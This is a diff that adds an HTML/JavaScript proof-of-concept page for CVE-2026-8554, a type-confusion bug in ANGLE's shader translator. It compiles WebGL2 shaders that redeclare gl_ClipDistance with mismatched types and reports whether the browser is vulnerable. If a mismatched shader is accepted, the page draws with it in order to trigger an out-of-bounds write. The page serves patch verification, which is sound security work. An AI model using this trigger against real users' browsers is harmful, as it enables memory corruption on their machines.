@@ -1,0 +1,70 @@
+<!doctype html>
+<!-- CVE-2026-8554 — ANGLE translator: redeclared built-in type confusion
+  Pre-fix (@130 ParseContext.cpp declareVariable:1516-1546) accepts a gl_ClipDistance
+  redeclaration whose basic type differs from the built-in (float). Fix CL 7736784
+  adds getBasicType()/nominalSize/secondarySize/arrayness equality checks.
+  Oracle: COMPILE_STATUS true  => VULNERABLE (mismatched redeclaration accepted)
+          COMPILE_STATUS false + "different type" => FIXED
+  Draw after link attempts to provoke the downstream OOB write (type confusion). -->
+<meta charset="utf-8">
+<title>CVE-2026-8554</title>
+<pre id="log">running…</pre>
+<script>
+const L=[];
+const log=(...a)=>{L.push(a.join(' '));document.getElementById('log').textContent=L.join('\n');};
+const ext = (gl,n)=>{try{return gl.getExtension(n)}catch(e){return null}};
+
+function errName(gl,e){for(const k of ['NO_ERROR','INVALID_ENUM','INVALID_VALUE','INVALID_OPERATION','OUT_OF_MEMORY','CONTEXT_LOST'])if(gl[k]===e)return k;return '0x'+e.toString(16);}
+
+// Mismatched-type redeclaration variants. Built-in gl_ClipDistance is float[N].
+const VARIANTS = [
+  {name:'vec4 arr (basic-type mismatch)',  mismatch:true,  src:'#version 300 es\n#extension GL_ANGLE_clip_cull_distance : enable\nout vec4 gl_ClipDistance[8];\nvoid main(){gl_Position=vec4(0.0);gl_ClipDistance[0]=vec4(0.0);}'},
+  {name:'int arr (basic-type mismatch)',   mismatch:true,  src:'#version 300 es\n#extension GL_ANGLE_clip_cull_distance : enable\nflat out int gl_ClipDistance[8];\nvoid main(){gl_Position=vec4(0.0);gl_ClipDistance[0]=0;}'},
+  {name:'mat4 arr (basic-type mismatch)',  mismatch:true,  src:'#version 300 es\n#extension GL_ANGLE_clip_cull_distance : enable\nout mat4 gl_ClipDistance[8];\nvoid main(){gl_Position=vec4(0.0);gl_ClipDistance[0]=mat4(0.0);}'},
+  {name:'float arr (CORRECT — control)',   mismatch:false, src:'#version 300 es\n#extension GL_ANGLE_clip_cull_distance : enable\nout float gl_ClipDistance[8];\nvoid main(){gl_Position=vec4(0.0);gl_ClipDistance[0]=0.0;}'},
+];
+const FSRC = '#version 300 es\nprecision highp float;\nout vec4 o;\nvoid main(){o=vec4(0.0);}';
+
+function run(kind){
+  log('--- context:',kind,'---');
+  const c=document.createElement('canvas');
+  const gl=c.getContext(kind,{antialias:false,depth:false,stencil:false,alpha:false});
+  if(!gl){log(kind,'unavailable');return 'NO-WEBGL';}
+  try{const d=gl.getExtension('WEBGL_debug_renderer_info');if(d){log('renderer:',gl.getParameter(d.UNMASKED_RENDERER_WEBGL));}}catch(e){}
+  const ccd = ext(gl,'WEBGL_clip_cull_distance');
+  log('WEBGL_clip_cull_distance:', ccd? 'AVAILABLE':'UNAVAILABLE');
+  if(!ccd){log('SKIP: extension unavailable on this backend');return 'NO-EXT';}
+  let anyMismatchAccepted=false;
+  for(const v of VARIANTS){
+    const s=gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(s,v.src); gl.compileShader(s);
+    const ok=gl.getShaderParameter(s,gl.COMPILE_STATUS);
+    const inf=(gl.getShaderInfoLog(s)||'').trim().replace(/\s+/g,' ').slice(0,140);
+    log(`[${v.name}] COMPILE_STATUS=${ok?'true':'false'}  ${ok?'<- ACCEPTED':'info: '+inf}`);
+    if(ok && v.mismatch){
+      anyMismatchAccepted=true;
+      // try link + draw to provoke the downstream type-confusion OOB
+      const p=gl.createProgram();
+      const fs=gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fs,FSRC); gl.compileShader(fs);
+      gl.attachShader(p,s); gl.attachShader(p,fs); gl.linkProgram(p);
+      const lok=gl.getProgramParameter(p,gl.LINK_STATUS);
+      log(`   link=${lok?'ok':'fail'}; drawArrays...`);
+      gl.useProgram(p);
+      gl.viewport(0,0,1,1);
+      gl.clearColor(0,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT);
+      gl.drawArrays(gl.POINTS,0,1);
+      log(`   post-draw glError=${errName(gl,gl.getError())} ctxLost=${gl.isContextLost()}`);
+    }
+    gl.deleteShader(s);
+  }
+  // verdict: ONLY mismatched-type variants count (the control must be accepted on both)
+  const verdict = anyMismatchAccepted ? 'VULNERABLE(mismatched redecl accepted)' : 'FIXED(mismatched redecl rejected)';
+  log('VERDICT:',verdict);
+  document.title='CVE-2026-8554: '+verdict.split('(')[0];
+  return verdict;
+}
+
+log('UA:',navigator.userAgent);
+let v=run('webgl2');
+if(v==='NO-WEBGL') log('VERDICT: WEBGL-UNAVAILABLE (try --ignore-gpu-blocklist)');
+</script>
